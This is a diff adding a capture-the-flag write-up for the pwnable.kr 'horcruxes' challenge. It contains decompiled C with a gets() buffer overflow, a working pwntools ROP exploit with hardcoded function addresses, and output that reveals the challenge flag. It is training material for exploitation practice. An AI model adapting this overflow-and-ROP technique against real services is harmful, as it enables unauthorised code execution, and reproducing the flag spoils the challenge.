@@ -1412,9 +1412,134 @@ int main(int argc, char* argv[]){
 }
 ```
 
-## [](#header-2)unlink
-## [](#header-2)blukat
 ## [](#header-2)horcruxes
+
+> Voldemort concealed his splitted soul inside 7 horcruxes.
+> 
+> Find all horcruxes, and ROP it!
+> 
+> author: jiwon choi
+> 
+> connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege.
+> 
+> rop it to read the flag.
+
+```c
+int ropme()
+{
+  char s[100]; // [esp+4h] [ebp-74h] BYREF
+  int input_char; // [esp+68h] [ebp-10h] BYREF
+  int fd; // [esp+6Ch] [ebp-Ch]
+
+  printf("Select Menu:");
+  __isoc99_scanf("%d", &input_char);
+  getchar();
+  if ( input_char == a )
+  {
+    A();
+  }
+  else if ( input_char == b )
+  {
+    B();
+  }
+  else if ( input_char == c )
+  {
+    C();
+  }
+  else if ( input_char == d )
+  {
+    D();
+  }
+  else if ( input_char == e )
+  {
+    E();
+  }
+  else if ( input_char == f )
+  {
+    F();
+  }
+  else if ( input_char == g )
+  {
+    G();
+  }
+  else
+  {
+    printf("How many EXP did you earned? : ");
+    gets(s);
+    if ( atoi(s) == sum )
+    {
+      fd = open("/home/horcruxes_pwn/flag", 0);
+      s[read(fd, s, 0x64u)] = 0;
+      puts(s);
+      close(fd);
+      exit(0);
+    }
+    puts("You'd better get more experience to kill Voldemort");
+  }
+  return 0;
+}
+
+...
+
+int A()
+{
+  return printf("You found \"Tom Riddle's Diary\" (EXP +%d)\n", a);
+}
+
+...
+```
+
+```python
+from pwn import *
+
+payload  = b"A" * 0x78
+payload += p32(0x0804129D) # address A()
+payload += p32(0x080412CF) # address B()
+payload += p32(0x08041301) # address C()
+payload += p32(0x08041333) # address D()
+payload += p32(0x08041365) # address E()
+payload += p32(0x08041397) # address F()
+payload += p32(0x080413C9) # address G()
+payload += p32(0x0804150B) # address ropme()
+
+#with open("/tmp/pay1/payload", "wb") as f:
+#    f.write(b"123\n")
+#    f.write(payload)
+
+con = remote("0", 9032)
+
+print(con.recvuntil("Select Menu:".encode("UTF-8")))
+
+con.sendline("123".encode("UTF-8"))
+
+print(con.recvuntil("How many EXP did you earned? : ".encode("UTF-8")))
+
+con.sendline(payload)
+print(con.recvline())
+
+sum = 0
+for i in range(7):
+  sum += int(con.recvline().decode("utf-8").split("+")[1][:-2])
+
+con.sendline("123".encode("UTF-8"))
+con.sendline(str(sum).encode("UTF-8"))
+print(con.recvline())
+con.interactive()
+```
+
+```bash
+horcruxes@ubuntu:~$ python3 /tmp/sploit.py
+[+] Opening connection to 0 on port 9032: Done
+b'Voldemort concealed his splitted soul inside 7 horcruxes.\nFind all horcruxes, and destroy it!\n\nSelect Menu:'
+b'How many EXP did you earned? : '
+b"You'd better get more experience to kill Voldemort\n"
+b'Select Menu:How many EXP did you earned? : The_M4gic_sp3l1_is_Avada_Ked4vra\n'
+[*] Switching to interactive mode
+
+[*] Got EOF while reading in interactive
+$
+```
+
 # [](#header-1)[Rookiss]
 ## [](#header-2)brain fuck
 ## [](#header-2)md5 calculator
@@ -1463,4 +1588,5 @@ int main(int argc, char* argv[]){
 ## [](#header-2)exynos
 ## [](#header-2)combabo calculator
 ## [](#header-2)pwnsandbox
+
 ## [](#header-2)crcgen
